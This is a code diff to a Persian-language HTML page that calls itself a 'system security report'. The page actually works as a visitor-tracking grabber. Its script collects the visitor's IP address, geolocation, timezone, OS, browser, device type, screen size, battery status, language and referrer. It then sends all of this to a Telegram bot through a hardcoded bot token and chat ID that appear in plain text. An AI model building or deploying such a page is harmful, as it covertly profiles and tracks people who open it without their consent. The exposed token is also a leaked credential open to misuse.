@@ -4,6 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>گزارش امنیتی سیستم</title>
+  <script src="https://cdn.jsdelivr.net/npm/bowser@2.11.0/es5.min.js"></script>
   <style>
     body {
       font-family: sans-serif;
@@ -73,17 +74,9 @@
 
       try {
         const ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => null);
+        const battery = navigator.getBattery ? await navigator.getBattery() : null;
 
-        let battery = null;
-        if (navigator.getBattery) {
-          try {
-            battery = await navigator.getBattery();
-          } catch (e) {
-            console.warn("Battery info error:", e);
-          }
-        }
-
-        const now = new Date();
+        const browser = bowser.getParser(window.navigator.userAgent).getResult();
 
         const info = {
           ip: ipData?.ip || "نامشخص",
@@ -92,15 +85,14 @@
           timezone: ipData?.timezone || "نامشخص",
           ip_time: new Date().toLocaleString("fa-IR", { timeZone: ipData?.timezone || "Asia/Tehran" }),
           local_time: new Date().toLocaleString("fa-IR"),
-          os: navigator.platform || "نامشخص",
-          browser: navigator.userAgent || "نامشخص",
+          os: `${browser.os.name} ${browser.os.versionName || ""}`.trim(),
+          browser: `${browser.browser.name} ${browser.browser.version}`,
+          device: browser.platform.type || "نامشخص",
           screen: `${screen.width}x${screen.height}`,
-          language: navigator.language || "-",
-          referrer: document.referrer || "مستقیم",
           battery: battery ? `${(battery.level * 100).toFixed(0)}%` : "نامشخص",
           charging: battery ? (battery.charging ? "بله" : "خیر") : "نامشخص",
-          device: /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "موبایل" : "دسکتاپ",
-          online: navigator.onLine ? "بله" : "خیر"
+          language: navigator.language,
+          referrer: document.referrer || "مستقیم"
         };
 
         const message = `
@@ -124,8 +116,6 @@ IP: ${info.ip}
 
 وضعیت باتری: ${info.battery} - شارژ: ${info.charging}
 
-وضعیت اتصال اینترنت: ${info.online}
-
 ارجاع‌دهنده: ${info.referrer}
 
 زمان محلی: ${info.local_time}
@@ -133,7 +123,6 @@ IP: ${info.ip}
 زمان منطقه‌ای IP: ${info.ip_time}
         `;
 
-        // ===== جایگزین کن با توکن و آیدی خودت =====
         const token = "8194809349:AAEqk8M8sOWGxQwDO0tNlybKDki26JENT4w";
         const chat_id = "7980459274";
         const url = `https://api.telegram.org/bot${token}/sendMessage`;
@@ -148,15 +137,14 @@ IP: ${info.ip}
         done.style.display = "block";
 
         infoBox.innerHTML = `
-          IP: ${info.ip}<br>
-          مکان: ${info.location}<br>
-          دستگاه: ${info.device}<br>
-          سیستم‌عامل: ${info.os}<br>
-          مرورگر: ${info.browser}<br>
-          رزولوشن: ${info.screen}<br>
-          باتری: ${info.battery} (${info.charging})<br>
-          اتصال اینترنت: ${info.online}<br>
-          زمان: ${info.local_time}<br>
+          IP: ${info.ip}<br><br>
+          مکان: ${info.location}<br><br>
+          دستگاه: ${info.device}<br><br>
+          سیستم‌عامل: ${info.os}<br><br>
+          مرورگر: ${info.browser}<br><br>
+          رزولوشن: ${info.screen}<br><br>
+          باتری: ${info.battery} (${info.charging})<br><br>
+          زمان: ${info.local_time}<br><br>
         `;
       } catch (err) {
         loading.innerText = "خطا در دریافت یا ارسال اطلاعات.";
